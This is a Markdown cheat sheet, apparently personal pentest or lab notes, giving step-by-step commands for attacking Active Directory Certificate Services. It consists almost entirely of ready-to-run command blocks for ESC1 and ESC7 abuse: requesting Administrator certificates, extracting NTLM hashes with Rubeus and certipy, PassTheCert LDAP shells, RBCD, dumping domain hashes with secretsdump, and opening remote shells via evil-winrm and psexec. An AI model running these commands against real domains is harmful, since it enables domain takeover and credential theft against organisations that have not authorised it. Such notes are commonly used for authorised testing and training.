---
title: "ADCS"
date: 2024-7-23
tags: ["certificate services", "active driectory", "ad", "Windows", "certify", "adcs", "esc", "PassTheCert"]
---

---
### Enum (From Linux)

#### certipy-ad

```bash
# Use certipy-ad
certipy-ad find -u <USERNAME> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable
```

#### nxc

```bash
# Use nxc
nxc ldap 10.10.11.10 -u <USERNAME> -p <PASSWORD> -M adcs
```

### Enum (From Windows)

#### Powershell

```powershell
# Check ADCS service
net start | findstr /i cert
```

```powershell
# Check env
certutil
```

```powershell
# Get list of certificate templates
certutil -catemplates
```

#### Certify.exe

```powershell
# Get info of each template
.\certify.exe find
```

```powershell
# Find vuln template
.\certify.exe find /vulnerable /currentuser
```

#### ADCSTemplate

[ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)

```powershell
import-module .\ADCSTemplate.psm1
```

```powershell
get-adcstemplate | fl displayname
```

### ESC1

```
+----------------------------------------------------------+
| Enabled                        : True                    |
| Client Authentication          : True                    |
| Enrollee Supplies Subject      : True                    |
| Certificate Name Flag          : EnrolleeSuppliesSubject |
| Requires Management Approval   : False                   |
| Authorized Signatures Required : 0                       |
+----------------------------------------------------------+
```

#### Abuse #1. Add smartcard logon

[PoshADCS](https://github.com/cfalta/PoshADCS)

```powershell
. .\PowerView.ps1
```

```powershell
. .\ADCS.ps1
```

```powershell
# Add smartcart logon
Get-SmartCardCertificate -Identity Administrator -TemplateName <vuln_template> -NoSmartCard -Verbose
```

```powershell
# Get Cert_Thumbprint
Get-ChildItem cert:\currentuser\my -recurse
```

```powershell
# Get NTLM hash
.\rubeus.exe asktgt /user:Administrator /certificate:<Cert_Thumbprint> /getcredentials /show /nowrap
```

```bash
# Remote
impacket-psexec -hashes :<HASH> administrator@10.10.11.10 cmd.exe
```

#### Abuse #2. Set alternative name (From Windows)

```powershell
# Generate Cert with altname
.\Certify.exe request /ca:<CA_NAME> /template:<VULN_TEMPLATE> /altname:administrator
```

```bash
# Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```powershell
# Get NTLM hash
.\rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials /show /nowrap
```

```bash
# Remote
evil-winrm -i 10.10.11.10 -u administrator -H <HASH>
```

#### Abuse #2. Set alternative name (From Kali)

```bash
# Generate Cert with altname
certipy-ad req -u <USERNAME> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE>
```

```bash
# Get NTLM hash
sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
```

```bash
# Remote
evil-winrm -i 10.10.11.10 -u administrator -H <HASH>
```

#### Abuse #3. Set msPKI-Certificate-Name-Flag

[ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)

```powershell
import-module .\ADCSTemplate.psm1
```

```powershell
Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
```

```powershell
$template = cat template.json -raw | ConvertFrom-Json
```

```powershell
$template.'msPKI-Certificate-Name-Flag' = 0x1
```

```powershell
$template | ConvertTo-Json | Set-Content template_mod.json
```

```powershell
New-ADCSTemplate -DisplayName "vuln_esc1" -Publish -JSON (cat template_mod.json -raw)
```

```powershell
Set-ADCSTemplateACL -DisplayName "vuln_esc1" -type allow -identity '<DOMAIN>\<USERNAME>' -enroll
```

```bash
# Generate Cert with altname
certipy-ad req -u <USERNAME> -p <PASSWORD> -target <TARGET> -upn administrator@<DOMAIN> -ca <CA_NAME> -template vuln_esc1
```

```bash
# Get NTLM hash
sudo ntpdate -s <DC> && certipy-ad auth -pfx administrator.pfx
```

```bash
# Remote
evil-winrm -i 10.10.11.10 -u administrator -H <HASH>
```

### Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP

[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)

#### Path #1. LDAP Shell

```bash
# Create key
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
```

```bash
# Create cert
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
```

```bash
# LDAP shell
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

```bash
# Add user to administrators group within the ldap shell
add_user_to_group <USERNAME> administrators
```

```bash
# Remote
evil-winrm -i <TARGET_DOMAIN> -u <USERNAME> -p <PASSWORD>
```

#### Path #2. RBCD

```bash
python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'Evil_Computer$' -crt administrator.crt -key administrator.key -domain <DOMAIN> -dc-ip <DC>
```

```bash
sudo ntpdate -s <DC> && python3 impacket-getST -spn 'cifs/<TARGET_DOMAIN>' -impersonate Administrator '<DOMAIN>/Evil_Computer$:<PASSWORD>'
```

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-secretsdump <DOMAIN>/Administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-ntlm
```

```bash
# Remote
evil-winrm -i <TARGET_DOMAIN> -u Administrator -H <HASH>
```

### ESC7

```
+---------------------+
| Access Right        |
|=====================|
| Manage CA           |
| Manage Certificates |
+---------------------+
```

```bash
# Use ManageCA to add manage certificates permission
certipy-ad ca -ca <CA_NAME> -add-officer <USERNAME> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```bash
# Check
certipy-ad find -dc-ip <DC> -ns 10.10.11.10 -u <USERNAME>@<DOMAIN> -p <PASSWORD> -vulnerable -stdout
```

```bash
# Request Cert based on SubCA (Take note: Request ID)
certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -template SubCA -upn administrator@<DOMAIN> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```bash
# Issue request using ManageCA and Manage Certificates privilege
certipy-ad ca -ca <CA_NAME> -issue-request <Request_ID> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```bash
certipy-ad req -ca <CA_NAME> -target <TARGET_DOMAIN> -retrieve <Request_ID> -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC>
```

<br>